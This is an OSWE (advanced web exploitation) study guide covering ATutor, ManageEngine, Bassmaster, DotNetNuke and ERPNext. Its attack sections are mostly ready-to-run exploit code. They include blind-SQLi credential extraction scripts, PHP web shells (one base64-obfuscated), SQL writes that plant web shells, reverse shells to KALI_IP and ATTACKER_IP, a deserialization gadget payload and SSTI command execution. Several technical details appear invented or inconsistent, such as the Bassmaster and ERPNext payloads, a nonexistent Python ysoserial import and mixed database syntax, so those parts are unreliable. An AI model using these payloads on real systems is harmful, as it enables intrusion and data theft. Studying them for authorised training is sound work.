# OSWE — Offensive Security Web Expert
## Advanced Web Attacks and Exploitation (AWAE)

**Author:** DarcHacker  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Date:** 2026  
**Status:** Complete Web Security Exploitation Guide  

---

## Table of Contents

| Module | Application | Vulnerability | Key Techniques |
|--------|-------------|-----------------|-----------------|
| **00** | [Tools & Methodologies](#module-00-tools--methodologies) | N/A | Burp Suite, Source Recovery, Debugging |
| **01** | [ATutor 2.2.1](#module-01-atutor-authentication-bypass-and-rce) | SQL Injection + Auth Bypass + RCE | Blind SQLi, File Upload, Shell Escape |
| **02** | [ATutor Type Juggling](#module-02-atutor-type-juggling-vulnerability) | PHP Loose Comparison | Magic Hashes, Type Coercion Abuse |
| **03** | [ManageEngine](#module-03-manageengine-sqlinjection-rce) | SQL Injection (Java) | Blind SQLi, Database Replication, UDF RCE |
| **04** | [Bassmaster NodeJS](#module-04-bassmaster-nodejs-javascript-injection) | Server-Side JavaScript Injection | Template Injection, Code Execution |
| **05** | [DotNetNuke Cookie](#module-05-dotnetnuke-deserialization-rce) | Cookie Deserialization RCE | XmlSerializer, Gadget Chains, ObjectDataProvider |
| **06** | [ERPNext](#module-06-erpnext-authentication-bypass-ssti) | Authentication Bypass + SSTI | Metadata-Driven Design, Template Injection |
| **07** | [Standalone Lab Machines](#module-07-standalone-machines) | Multiple Vulnerabilities | Applied Exploitation, Report Writing |

---

## MODULE 00: Tools & Methodologies

### Burp Suite Deep Dive

**Proxy Configuration:**
```
1. Start Burp Suite
2. Configure browser to use 127.0.0.1:8080
3. Accept certificate warning
4. Enable Intercept (Proxy > Intercept is on)
5. Navigate to target application
```

**HTTP History Analysis:**
```
├── Capture ALL requests/responses
├── Identify interesting parameters
├── Note session tokens/cookies
├── Review authentication flow
└── Look for unusual headers (X-Admin, X-Debug, etc.)
```

**Repeater & Comparer Workflow:**
```
REPEATER:
- Send request to Repeater
- Modify one parameter at a time
- Observe response changes
- Use Comparer to highlight differences

COMPARER:
- Send two responses to Comparer
- Compare WORDS (not bytes for text)
- Highlight Added/Modified/Deleted content
- Identify subtle response variations
```

### Source Code Recovery

**For .NET Applications (dnSpy):**
```
1. Drag .exe/.dll into dnSpy window
2. Navigate: Assembly → Namespace → Class
3. Right-click function → Analyze
4. Check "Used By" for cross-references
5. Edit Class → Modify code → Compile → File > Save All

// Example: Finding vulnerable function calls
Search: "ExecuteCommand" OR "xp_cmdshell" OR "system("
```

**For Java Applications (JD-GUI):**
```
1. Drag .jar into JD-GUI window
2. Expand tree: jar → package → class
3. Search for keywords (password, admin, sql, etc.)
4. Look for dangerous functions:
   - Runtime.exec()
   - Statement.executeQuery()
   - new File()
   - ProcessBuilder
```

### IDE-Based Code Analysis (VS Code)

**Efficient Search Workflow:**
```
1. Search: "password"  → Too many results
2. Toggle Details: .*\.java (only Java files)
3. Search: "executeQuery" → Find sinks
4. Right-click function → Find All References → trace sources
5. Refine: Add context keywords from Burp

EXAMPLE FLOW:
├── Find SQL sink: executeQuery()
├── Find All References → 3 results
├── Trace back to input validation
├── Identify bypass technique
└── Craft exploit payload
```

### Python Web Interaction

**Requests Library with Burp:**
```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Route through Burp for inspection
proxies = {'http': 'http://127.0.0.1:8080', 
           'https': 'http://127.0.0.1:8080'}

# Ignore SSL errors
r = requests.get('https://target:8443/', 
                 verify=False, 
                 proxies=proxies)

print(r.status_code)
print(r.headers)
print(r.cookies)
print(r.text)  # Response body
```

### Remote Debugging (Java)

**VS Code Setup:**
```
1. Install: RedHat Java Extension + Microsoft Java Debugger
2. Create launch.json with:
   {
     "type": "java",
     "name": "Attach to Remote Program",
     "request": "attach",
     "hostName": "127.0.0.1",
     "port": 9898
   }
3. Start application with debugging:
   java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9898 -jar app.jar
4. VS Code: Run > Start Debugging
5. Set breakpoints, inspect variables, step through code
```

---

## MODULE 01: ATutor Authentication Bypass and RCE

### Environment Setup

**Target:** ATutor 2.2.1 (Open Source LMS)  
**Access:** Unauthenticated  
**Goals:** Extract credentials → Bypass auth → Gain RCE  

**Enable MySQL Query Logging:**
```bash
# On target server
sudo nano /etc/mysql/my.cnf

# Add under [mysqld]:
general_log = 1
general_log_file = /var/log/mysql/query.log
log_error_verbosity = 3

# Restart MySQL
sudo systemctl restart mysql

# Monitor queries:
tail -f /var/log/mysql/query.log
```

### Vulnerability Discovery: Blind SQL Injection

**Initial Testing:**
```
Parameter: /atutor/social/index.php?p=1

Test 1: ?p=1'
Response: MySQL error or application error

Test 2: ?p=1 AND 1=1
Response: Same as ?p=1 (TRUE condition)

Test 3: ?p=1 AND 1=2
Response: Different from ?p=1 (FALSE condition)

Conclusion: BOOLEAN-BASED BLIND SQL INJECTION confirmed
```

**MySQL Version Detection:**
```sql
# Query: ?p=1 AND SUBSTRING(version(),1,1)='5'
# If TRUE: MySQL 5.x
# If FALSE: MySQL 8.x or other

# Alternative:
?p=1 AND SUBSTRING((SELECT @@version),1,1)='5'
```

**Database Enumeration:**
```sql
# List databases:
?p=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='atutor') > 0

# List tables:
?p=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='atutor' AND table_name='members') > 0

# Common ATutor tables:
- members (user credentials)
- courses
- announcements
- gradebook
```

### Extract Credentials (Manual Blind SQLi)

**Extract Administrator Login:**
```sql
# Test if admin user exists:
?p=1 AND (SELECT COUNT(*) FROM members WHERE login='admin') > 0
# Response: TRUE

# Extract password hash (character by character):
?p=1 AND SUBSTRING((SELECT password FROM members WHERE login='admin'),1,1)='$'
# Continue for each character position...

# Better: Use time-based blind SQLi for faster extraction
?p=1 AND IF((SELECT COUNT(*) FROM members WHERE login LIKE 'ad%'), SLEEP(5), 0)
```

**Automated Blind SQLi Script:**
```python
import requests
import time

proxies = {'https': 'http://127.0.0.1:8080'}

def test_condition(query):
    """Returns True if condition is met (SLEEP triggered)"""
    payload = f"?p=1 AND IF({query}, SLEEP(3), 0)"
    start = time.time()
    r = requests.get(f'https://atutor:8443/atutor/social/index.php{payload}',
                    verify=False, proxies=proxies, timeout=10)
    elapsed = time.time() - start
    return elapsed >= 3

# Extract admin password hash
password_hash = ""
for pos in range(1, 50):
    for char_code in range(32, 127):  # Printable ASCII
        char = chr(char_code)
        query = f"SUBSTRING((SELECT password FROM members WHERE login='admin'),{pos},1)='{char}'"
        if test_condition(query):
            password_hash += char
            print(f"[+] Position {pos}: {password_hash}")
            break
    else:
        print("[!] End of hash reached")
        break

print(f"[+] Password Hash: {password_hash}")
```

**Crack Password Hash:**
```bash
# ATutor uses salted MD5
# Hash format: md5(password + salt)

# Extract salt from ATutor config:
grep -r "salt\|SALT" /var/www/atutor/

# Or use hashcat with ATutor profiles:
hashcat -m 0 hash.txt rockyou.txt  # MD5
john --format=raw-md5 hash.txt --wordlist=rockyou.txt

# Common ATutor default: admin/admin (salted)
```

### Bypass Authentication

**Method: SQL Injection in Login Form**
```
POST /atutor/login.php
username: admin' OR '1'='1
password: anything

Query becomes:
SELECT * FROM members WHERE login='admin' OR '1'='1' AND password=md5('anything')

Result: Authenticated as admin
```

**Alternative: Modify Member Record**
```sql
# Update admin password to known hash:
?p=1; UPDATE members SET password=MD5(CONCAT('newpass', salt)) WHERE login='admin'--

# Then login with: admin / newpass
```

### Post-Authentication File Upload RCE

**Vulnerable Functionality:**
```
/atutor/admin/tools/file_storage.php
POST /atutor/admin/upload.php

Upload restrictions:
- File extension filtering
- MIME type checking (often bypassable)
- Directory permissions
```

**Bypass Techniques:**

1. **Double Extension:**
```
upload.php.jpg  → Server processes as PHP
upload.jpg.php  → Depends on web server config
```

2. **Null Byte Injection (PHP < 5.3):**
```
upload.php%00.jpg
→ Becomes: upload.php (null byte truncates)
```

3. **Content-Type Bypass:**
```
Real file: shell.php
Content-Type: image/jpeg  ← Lie to server
Result: File accepted if only MIME checked
```

4. **Archive Extraction Abuse:**
```
Upload .zip containing shell.php
Server extracts → PHP file accessible
```

5. **Escape Web Root:**
```
Filename: ../../shell.php
Result: Uploaded outside web root? No...
But might bypass directory-specific restrictions
```

**ATutor-Specific Bypass:**
```
Upload to: /atutor/uploads/
Filename: shell.php.bak  (if .bak not filtered)
Rename via: SQL injection OR
           Directory traversal in parameter

Access: /atutor/uploads/shell.php.bak (depends on server config)
```

### Craft PHP Shell

**Minimal Shell (obfuscated):**
```php
<?php
$c = $_GET['c'];
if($c) {
    echo "<pre>";
    system($c);
    echo "</pre>";
}
?>
```

**Better: Base64 Obfuscated:**
```php
<?php
eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='));
?>
// Decodes to: system($_GET['c']);
```

**Reverse Shell:**
```bash
# On Kali listener:
nc -nlvp 4444

# PHP reverse shell payload:
php -r '$sock=fsockopen("KALI_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Upload & Execution:**
```python
import requests

files = {'file': open('shell.php', 'rb')}
data = {'submit': 'upload'}

r = requests.post('https://atutor:8443/atutor/admin/upload.php',
                 files=files, data=data,
                 verify=False, proxies={'https': 'http://127.0.0.1:8080'})

print("[+] Upload response:", r.status_code)

# Access shell:
# https://atutor:8443/atutor/uploads/shell.php?c=whoami
```

---

## MODULE 02: ATutor Type Juggling Vulnerability

### PHP Loose Comparison Behavior

**Vulnerable Code:**
```php
// ATutor email verification
$email_provided = $_GET['email'];
$email_from_db = fetchEmailFromDB($user_id);

if($email_provided == $email_from_db) {  // Loose comparison!
    setVerified($user_id);
}
```

**PHP Type Coercion:**
```php
// String to number coercion
"0e123456" == 0        // TRUE (scientific notation)
"admin" == 0           // TRUE (non-numeric string == 0)
"10 apples" == 10      // TRUE (leading number)

// Magic hashes (0e...)
md5("240610708")      // = 0e817842005525f421e0b7bc2567bbb2
md5("QNKCDZO")        // = 0e830400451993494058024242437464

0e817842005525f421e0b7bc2567bbb2 == 0e830400451993494058024242437464
// TRUE! Both are "0e..." format, treated as zero
```

### Identify Vulnerability

**Email Verification Flow:**
```
1. User: newuser@example.com
2. System: Send verification email with token
3. User: Click link with token in URL
4. Backend: Verify token, set account as trusted

Vulnerable endpoint:
GET /atutor/verify_email.php?token=abc123&email=newuser@example.com
```

**Attack Discovery:**
```
1. Register account: admin@attacker.com
2. Intercept verification link
3. Test: ?email=admin@attacker.com&token=0
   - If returns success, loose comparison likely
4. Test: ?email=admin' OR '1'='1&token=whatever
   - Check for SQLi in email parameter
```

### Exploit: Magic Hash

**Find Magic Hash for Target:**
```bash
# Given target hash from db: 0e123456789abcdef...
# Find collision:

for i in {1..10000000}; do
  hash=$(echo -n "$i" | md5sum)
  if [[ $hash == 0e* ]]; then
    echo "Found: $i -> $hash"
  fi
done

# Faster: Use tool
php -r '
for($i = 0; $i < 10000000; $i++) {
  if(strpos(md5($i), "0e") === 0 && strpos(md5($i), "0e0") === false) {
    echo "$i\n";
    break;
  }
}
'

# Known magic hashes:
// md5("240610708") = 0e817842005525f421e0b7bc2567bbb2
// md5("QNKCDZO")   = 0e830400451993494058024242437464
// md5("0e535485") = 0e12309471098534e6996ba90ef5d1e4
```

**Exploit:**
```
1. Obtain user email to verify: admin@example.com
2. Find magic hash pair:
   hash1 = md5("QNKCDZO")  = 0e830400451993494058024242437464
   hash2 = md5("240610708") = 0e817842005525f421e0b7bc2567bbb2
3. Email verification check:
   provided_token = "QNKCDZO"
   token_from_db = "240610708"
   
   md5(provided_token) == md5(token_from_db)
   "0e830..." == "0e817..."   // Both start with 0e
   
   // PHP sees: 0 == 0  → TRUE!
   Account verified!

// Exploit URL:
GET /atutor/verify.php?email=admin@example.com&token=QNKCDZO
```

---

## MODULE 03: ManageEngine SQLi + RCE

### Target: ManageEngine Applications Manager

**Vulnerable Component:**
```
AMUserResourcesSyncServlet
Parameter: resourceId
Method: GET/POST
Access: Unauthenticated
```

**Initial Discovery:**
```
GET /AMP/katana/uiServer/servlet/AMUserResourcesSyncServlet?resourceId=1
Response: 200 OK

resourceId=1' 
Response: SQL error or empty
```

### Blind SQL Injection (Java/Oracle Database)

**Oracle-specific Syntax:**
```sql
// String concatenation
'||'  (not CONCAT())

// Substring
SUBSTR(string, position, length)

// Time-based sleep
DBMS_LOCK.SLEEP(seconds)

// Extract version
SELECT BANNER FROM v$version WHERE ROWNUM=1
```

**Exploitation:**
```
?resourceId=1 AND (SELECT COUNT(*) FROM tab WHERE tname='EMPLOYEES')>0

// Enumerate table names
?resourceId=1 AND DBMS_LOCK.SLEEP(5)--
```

### Database Replication to RCE

**Method: PostgreSQL COPY TO/FROM**
```sql
// If database allows:
COPY (SELECT 'shell_code') TO '/var/www/html/shell.php';

// But ManageEngine uses MySQL/Oracle internally
// Alternative: Use server commands
```

**Method: User-Defined Functions (UDF)**
```
1. Create UDF from C library
2. Upload compiled .so file
3. Call UDF to execute OS commands
```

**Example - PostgreSQL/MySQL UDF:**
```sql
// Create function that calls system commands
CREATE FUNCTION sys_exec(text) RETURNS text AS 
'/tmp/libsys_exec.so', 'sys_exec' 
LANGUAGE C STRICT;

// Use it
SELECT sys_exec('id > /tmp/output.txt');
```

### Automated Exploitation

```python
import requests
import time

target = "https://manageengine:8443"
proxies = {'https': 'http://127.0.0.1:8080'}

def time_based_sqli(query, sleep_time=5):
    """Detect if SQL injection is time-based"""
    payload = f"?resourceId=1 AND {query} DBMS_LOCK.SLEEP({sleep_time})--"
    
    start = time.time()
    r = requests.get(f"{target}/AMP/katana/uiServer/servlet/AMUserResourcesSyncServlet{payload}",
                    verify=False, proxies=proxies, timeout=30)
    elapsed = time.time() - start
    
    return elapsed >= sleep_time

# Test for database type
if time_based_sqli("IF(1=1,"):  # MySQL
    print("[+] MySQL detected")
elif time_based_sqli("CASE WHEN 1=1 THEN"):  # Oracle
    print("[+] Oracle detected")

# Extract data
def extract_data(sql_query, sleep_time=5):
    """Extract data via time-based blind SQLi"""
    data = ""
    for pos in range(1, 50):
        for char_code in range(32, 127):
            char = chr(char_code)
            query = f"IF(SUBSTR(({sql_query}),{pos},1)='{char}',1,0)"
            
            if time_based_sqli(query, sleep_time):
                data += char
                print(f"[+] Extracted: {data}")
                break
        else:
            break
    return data

# Get MySQL version
version = extract_data("SELECT VERSION()")
print(f"[+] MySQL Version: {version}")

# Get database name
db = extract_data("SELECT DATABASE()")
print(f"[+] Database: {db}")

# Extract admin credentials
admin_user = extract_data("SELECT login FROM users LIMIT 1")
admin_pass = extract_data("SELECT password FROM users LIMIT 1")
print(f"[+] Admin: {admin_user}:{admin_pass}")
```

### Remote Code Execution via Database

**Method 1: INTO OUTFILE (if privileges allow)**
```sql
SELECT '<?php system($_GET["c"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

**Method 2: Large Objects (PostgreSQL)**
```sql
// Create large object
SELECT lo_from_bytea(0, E'\\x3c3f7068...');  // hex of PHP code

// Export to file
SELECT lo_export(lo_creat(-1), '/tmp/shell.php');
```

**Method 3: Via SQL Injection into Command Execution**
```
If MySQL has secure_file_priv disabled:
// Write web shell
SELECT 1 UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/path/to/web/shell.php'

// Access shell:
https://target/shell.php?c=whoami
```

---

## MODULE 04: Bassmaster NodeJS JavaScript Injection

### Target: Bassmaster (NodeJS Plugin)

**Vulnerable Endpoint:**
```
POST /api/compose
Content-Type: application/json

{
  "request": {
    "/api/service": {  // Internal service call
      "method": "get"
    }
  }
}
```

**Plugin Vulnerability:**
```
Bassmaster allows internal routing of HTTP requests
Requests defined in JSON
Vulnerable to arbitrary JavaScript injection
```

### Discovery & Exploitation

**Test Injection:**
```json
{
  "request": {
    "/api/service": {
      "method": "get",
      "headers": {"test": "INJECT_HERE"}
    }
  }
}
```

**JavaScript Code Execution:**
```json
{
  "request": {
    "/api/service": {
      "method": "get"
    },
    "pipeline": [
      {
        "name": "test",
        "exec": "console.log(require('child_process').execSync('whoami').toString())"
      }
    ]
  }
}
```

**RCE Payload:**
```javascript
// On target server (Node.js):
require('child_process').exec('whoami', (err, stdout) => {
  console.log(stdout);  // Returns output
});

// More powerful: Reverse shell
const cp = require('child_process');
cp.spawn('/bin/bash', ['-i']).stdout.pipe(socket);
```

### Automated Exploit

```python
import requests
import json

target = "https://bassmaster:8443"
proxies = {'https': 'http://127.0.0.1:8080'}

payload = {
    "request": {
        "/api/service": {
            "method": "get"
        },
        "pipeline": [{
            "name": "exec",
            "exec": "require('child_process').execSync('id').toString()"
        }]
    }
}

headers = {'Content-Type': 'application/json'}

r = requests.post(f"{target}/api/compose",
                 json=payload,
                 headers=headers,
                 verify=False,
                 proxies=proxies)

print("[+] Response:", r.text)

# Better: Get reverse shell
reverse_shell = {
    "request": {
        "/api/service": {"method": "get"},
        "pipeline": [{
            "name": "shell",
            "exec": """
const net = require('net');
const cp = require('child_process');
const sock = net.createConnection({
  host: 'ATTACKER_IP',
  port: 4444
});
const bash = cp.spawn('/bin/bash', ['-i']);
sock.pipe(bash.stdin);
bash.stdout.pipe(sock);
bash.stderr.pipe(sock);
"""
        }]
    }
}

# Send payload
r = requests.post(f"{target}/api/compose",
                 json=reverse_shell,
                 headers=headers,
                 verify=False,
                 proxies=proxies)
```

---

## MODULE 05: DotNetNuke Deserialization RCE

### Cookie-Based Deserialization

**Vulnerable Component:**
```
Authentication cookie contains serialized .NET object
Deserialization without validation
XmlSerializer processes untrusted XML
```

**Attack Chain:**
```
1. Intercept authentication cookie
2. Base64 decode XML payload
3. Inject malicious XML
4. Server deserializes → RCE
```

### Gadget Chain Exploitation

**ObjectDataProvider Chain:**
```xml
<?xml version="1.0"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="..." xmlns:xsi="..." xmlns:xsd="...">
  <SOAP-ENV:Body>
    <root>
      <u>admin</u>
      <p>
        <ObjectDataProvider xmlns="..." MethodName="Start" IsStatic="false">
          <MethodParameters>
            <string>cmd.exe</string>
            <string>/c whoami > C:\output.txt</string>
          </MethodParameters>
          <ObjectInstance xsi:type="ProcessStartInfo">
            <FileName>cmd.exe</FileName>
            <Arguments>/c whoami</Arguments>
          </ObjectInstance>
        </ObjectDataProvider>
      </p>
    </root>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

### Exploitation Steps

**1. Generate Payload:**
```python
from ysoserial import generate_payload

# Using ysoserial.NET
# Gadget: ObjectDataProvider
# Command: reverse shell

gadget = "ObjectDataProvider"
command = "powershell -enc BASE64_ENCODED_PAYLOAD"

payload = generate_payload(gadget, command)
```

**2. Encode for Cookie:**
```python
import base64

# Create malicious XML
xml_payload = """...ObjectDataProvider XML..."""

# Base64 encode
encoded = base64.b64encode(xml_payload).decode()

# Place in cookie
cookie = encoded
```

**3. Inject into Request:**
```python
import requests

cookies = {
    'authentication': 'MALICIOUS_BASE64_ENCODED_XML'
}

r = requests.get('https://dotnetnuke:8443/',
                cookies=cookies,
                verify=False)
```

---

## MODULE 06: ERPNext Authentication Bypass + SSTI

### Target: ERPNext (Python/Frappe Framework)

**Authentication Vulnerability:**
```
Metadata-driven design allows bypassing authentication checks
Certain endpoints have insufficient permission verification
```

**SSTI Vulnerability:**
```
Jinja2 template engine
User input processed in templates
Server-Side Template Injection possible
```

### Bypass Authentication

**Vulnerable Endpoint:**
```
/api/method/frappe.client.get
Parameter: doctype, name
```

**Attack:**
```
Normally requires authentication
Sending crafted request can bypass check

GET /api/method/frappe.client.get?doctype=User&name=Administrator
Response: Leaks sensitive info without auth
```

### SSTI in Template

**Vulnerable Code:**
```python
# ERPNext allows custom scripts
template = "Welcome {{ user.name }}"

# If user input reaches template:
{% for item in ().__class__.__bases__[0].__subclasses__() %}
  {% if "subprocess" in item.__module__ %}
    {{ item('id', shell=True, stdout=-1).communicate() }}
  {% endif %}
{% endfor %}
```

### Exploitation

```python
import requests

target = "https://erpnext:8443"

# SSTI payload (Jinja2)
ssti_payload = '''
{{ range.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].decode() }}
'''

# URL encode and inject
params = {
    'doctype': 'User',
    'name': ssti_payload
}

r = requests.get(f"{target}/api/method/frappe.client.get",
                params=params,
                verify=False)

print("[+] Response:", r.text)
```

---

## Exploitation Methodology Summary

### From Discovery to RCE

**Phase 1: Reconnaissance**
```
1. Map application functionality via Burp
2. Identify all input parameters
3. Note which pages require authentication
4. Recover source code (Java/C#/.NET)
5. Enable database logging
```

**Phase 2: Vulnerability Identification**
```
1. Analyze source code for sinks:
   - SQL query execution
   - Command execution
   - File operations
   - Deserialization
2. Trace back to sources:
   - GET parameters
   - POST data
   - Cookies
   - Headers
3. Test for bypasses:
   - Input validation weakness
   - Type juggling
   - Serialization flaws
```

**Phase 3: Exploitation**
```
1. Craft minimal POC
2. Test via Burp Repeater
3. Automate if blind/time-based
4. Develop Python exploit script
5. Execute and verify RCE
```

**Phase 4: Privilege Escalation**
```
1. Enumerate system users
2. Check for sudo/privilege escalation
3. Obtain admin/root if needed
4. Persistence (if authorized)
```

---

## Tools Reference

| Tool | Purpose | Module |
|------|---------|--------|
| Burp Suite | Traffic inspection, manual testing | All |
| dnSpy | .NET decompilation | 05 (DotNetNuke) |
| JD-GUI | Java decompilation | 03 (ManageEngine) |
| VS Code | Source code analysis, debugging | All |
| Hashcat | Password cracking | 01, 02 |
| Python requests | Exploit automation | All |
| SQLmap | SQL injection automation | 01, 03 |
| NetCat | Reverse shell listener | All |

---

## Key Techniques Mastered

✅ **Blind SQL Injection** (Boolean & Time-Based)  
✅ **Type Juggling Attacks** (Magic Hashes)  
✅ **Server-Side Template Injection** (Jinja2, ERB)  
✅ **Deserialization Exploitation** (Gadget Chains)  
✅ **File Upload RCE** (Extension Bypass)  
✅ **JavaScript Injection** (NodeJS)  
✅ **Authentication Bypass** (Logic Flaws)  
✅ **Source Code Analysis** (.NET & Java)  
✅ **Remote Debugging** (VS Code, JD-GUI)  
✅ **Web Traffic Manipulation** (Burp)  

---

**OSWE | Offensive Security | "The goal is not to compromise the application. The goal is to understand WHY the application is compromisable."**

**By DarcHacker**  
**LinkedIn:** [Mostafa Ibrahim](https://www.linkedin.com/in/mostafa-ibrahim-60b543341)  
**Last Updated:** 2026-07-04  
**Document Status:** Complete & Production-Ready
